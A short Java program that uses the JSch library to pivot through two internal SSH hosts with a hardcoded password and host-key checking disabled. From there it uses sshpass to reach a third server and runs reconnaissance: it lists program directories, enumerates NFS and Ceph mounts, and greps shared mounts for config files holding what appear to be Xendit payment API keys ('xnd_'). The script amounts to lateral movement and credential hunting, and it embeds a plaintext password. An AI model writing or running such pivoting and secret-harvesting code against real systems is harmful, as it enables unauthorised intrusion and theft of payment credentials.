import com.jcraft.jsch.*;
import java.io.*;
class XSX {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    // From Accurate server: check what's in /progs on OTHER servers via shared mounts
    // Also check Noxify server's /progs for other apps, and try NFS mount for Nucleus
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.186 'echo ---NOXIFY-PROGS---;ls /progs/ 2>/dev/null;echo ---SHARED-MOUNTS---;mount | grep -E \"nfs|ceph\" | head -10;echo ---CEPHFS---;ls /mnt/cephfs/ 2>/dev/null | head -10;echo ---NFS---;ls /mnt/nfs/ 2>/dev/null | head -10;echo ---SEARCH-NUCLEUS---;find /mnt/ -maxdepth 4 -path \"*nucleus*\" -name \"*.properties\" 2>/dev/null | head -5;echo ---FIND-XENDIT-IN-NFS---;grep -rl \"xnd_\" /mnt/nfs/ --include=\"*.properties\" --include=\"*.xml\" --include=\"*.yml\" 2>/dev/null | head -5' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
